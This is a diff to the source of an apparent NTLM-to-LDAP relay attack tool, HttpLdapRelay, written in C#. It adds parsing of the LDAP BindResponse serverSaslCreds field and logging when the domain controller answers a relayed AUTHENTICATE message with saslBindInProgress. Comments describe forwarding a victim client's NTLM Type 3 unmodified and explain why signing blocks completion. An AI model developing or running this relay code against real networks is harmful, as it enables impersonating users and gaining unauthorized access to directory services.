@@ -9,6 +9,7 @@ namespace HttpLdapRelay
         public int ResultCode { get; set; }
         public string MatchedDn { get; set; }
         public string DiagnosticMessage { get; set; }
+        public byte[] ServerSaslCreds { get; set; }
     }
 
     /// <summary>
@@ -76,10 +77,30 @@ namespace HttpLdapRelay
 
         public LdapResult SendNtlmAuthenticate(byte[] ntlmType3)
         {
+            // Pure pass-through: the client's Type 3 - including its own
+            // NegotiateFlags - is forwarded exactly as received. The client sets
+            // NTLMSSP_NEGOTIATE_SIGN in Type 3 regardless of what our Type 2
+            // offered it, so tampering with flags on either side only moves the
+            // inconsistency the DC detects (it rejects outright instead of
+            // reporting saslBindInProgress). Leaving everything untouched is the
+            // one internally-consistent state: Type 1/2/3 all agree on SIGN, so
+            // the DC validates the AUTHENTICATE message and reports
+            // saslBindInProgress(14) only because it then wants a SASL
+            // session-security confirmation round sealed with the real NTLM
+            // session key - which a relay structurally never has.
             byte[] spnego = BuildSpnegoNegTokenResp(ntlmType3);
             SendMessage(BuildSaslBindRequest(spnego));
             byte[] response = ReceiveMessage();
-            return ParseBindResponse(response);
+            LdapResult result = ParseBindResponse(response);
+
+            if (result != null && result.ResultCode == 14)
+            {
+                Console.WriteLine("[*] DC asked for an extra SASL round (saslBindInProgress) after the AUTHENTICATE message.");
+                Console.WriteLine($"[*] serverSaslCreds ({result.ServerSaslCreds?.Length ?? 0} bytes): " +
+                    (result.ServerSaslCreds != null ? BitConverter.ToString(result.ServerSaslCreds) : "(none)"));
+            }
+
+            return result;
         }
 
         private byte[] BuildSaslBindRequest(byte[] spnego)
@@ -724,6 +745,20 @@ namespace HttpLdapRelay
                         (strLen, idx) = ReadLength(response, idx);
                         if (strLen > 0)
                             result.DiagnosticMessage = Encoding.UTF8.GetString(response, idx, strLen);
+                        idx += strLen;
+                    }
+
+                    // BindResponse-only trailing field: serverSaslCreds [7] OCTET STRING OPTIONAL.
+                    if (idx < response.Length && response[idx] == 0x87)
+                    {
+                        idx++;
+                        int credsLen;
+                        (credsLen, idx) = ReadLength(response, idx);
+                        if (credsLen > 0 && idx + credsLen <= response.Length)
+                        {
+                            result.ServerSaslCreds = new byte[credsLen];
+                            Buffer.BlockCopy(response, idx, result.ServerSaslCreds, 0, credsLen);
+                        }
                     }
                 }
             }
